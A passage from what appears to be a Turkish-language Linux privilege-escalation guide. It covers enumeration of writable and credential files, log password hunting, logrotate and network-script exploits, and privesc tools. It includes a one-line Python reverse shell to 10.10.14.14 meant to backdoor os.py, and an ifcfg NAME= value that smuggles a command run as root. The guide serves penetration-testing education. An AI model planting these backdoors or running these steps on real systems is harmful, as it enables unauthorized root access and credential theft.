find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyalar
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifre içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)'in kodunu inceleyin, şifre içerebilecek **birkaç olası dosya** arar.\
**Başka ilginç bir araç** olarak kullanabileceğiniz: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bilgisayarda saklanan çok sayıda şifreyi almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar tuhafsa, muhtemelen o kadar ilginç olacaktır.\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size audit loglarının içine **şifreleri kaydetmenizi** sağlayabilir, bu yazıda açıklandığı gibi: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Günlükleri okumak için [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Genel Creds Arama/Regex

Ayrıca dosya **adında** veya **içeriğinde** "**password**" kelimesini içeren dosyaları ve ayrıca loglar içinde IP'leri ve e-postaları veya hashes regexps kontrol etmelisin.\
Burada bunların hepsinin nasıl yapılacağını listelemeyeceğim ancak ilgileniyorsan [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsin.

## Yazılabilir dosyalar

### Python library hijacking

Eğer **nereden** bir python script'in çalıştırılacağını biliyorsan ve o klasöre **yazabiliyorsan** ya da **python kütüphanelerini değiştirebiliyorsan**, OS library'i değiştirip backdoor ekleyebilirsin (eğer python script'in çalıştırılacağı yere yazabiliyorsan, os.py kütüphanesini kopyalayıp yapıştır).

Kütüphaneyi **backdoor the library** yapmak için os.py kütüphanesinin sonuna aşağıdaki satırı ekle (IP ve PORT'u değiştir):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> This vulnerability affects `logrotate` version `3.18.0` and older

Zafiyetle ilgili daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scripti **yazabiliyor** veya var olan bir scripti **düzenleyebiliyorsa**, sisteminiz **pwned** olur.

Network scripts, _ifcg-eth0_ örneğin, ağ bağlantıları için kullanılır. Tam olarak .INI dosyaları gibi görünürler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumumda, bu network scriptlerindeki `NAME=` özniteliği düzgün işlenmiyor. Eğer isimde **boşluk varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu da demektir ki **ilk boşluktan sonraki her şey root olarak çalıştırılır**.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasındaki boşluğu unutmayın_)

### **init, init.d, systemd ve rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Kaynaklar

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
